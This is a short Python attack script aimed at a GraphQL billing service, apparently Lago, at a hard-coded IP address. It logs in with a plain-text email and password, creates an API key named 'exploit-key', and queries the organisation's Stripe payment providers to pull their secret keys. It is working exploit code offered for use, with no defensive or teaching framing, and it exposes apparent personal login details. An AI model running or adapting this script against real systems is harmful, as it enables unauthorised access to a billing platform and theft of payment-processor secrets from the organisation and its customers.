#!/usr/bin/env python3
"""Re-login and create admin API key"""
import requests
import json

url = "http://38.107.234.149:3000/graphql"
org = "655f020d-3950-477f-bbcb-9d4ae44fa25d"

# Login
r = requests.post(url, json={
    "query": 'mutation { loginUser(input: { email: "vladislavblaze5@gmail.com", password: "hexstrike2025!" }) { token } }'
})
token = r.json()["data"]["loginUser"]["token"]
print(f"Token: {token[:50]}...")

headers = {
    "Authorization": f"Bearer {token}",
    "x-lago-organization": org,
    "Content-Type": "application/json"
}

# Create API key
r2 = requests.post(url, json={
    "query": 'mutation { createApiKey(input: { name: "exploit-key" }) { apiKey { id value name permissions } } }'
}, headers=headers)
print(f"API Key response: {json.dumps(r2.json(), indent=2)[:300]}")

# Try to get Stripe provider with secret  
r3 = requests.post(url, json={
    "query": '{ organization { id name stripePaymentProviders { id name code secretKey } } }'
}, headers=headers)
print(f"\nStripe: {json.dumps(r3.json(), indent=2)[:300]}")

# Try paymentProviders
r4 = requests.post(url, json={
    "query": '{ paymentProviders { collection { ... on StripeProvider { id name code secretKey } } } }'
}, headers=headers)
print(f"\nPaymentProviders: {json.dumps(r4.json(), indent=2)[:300]}")
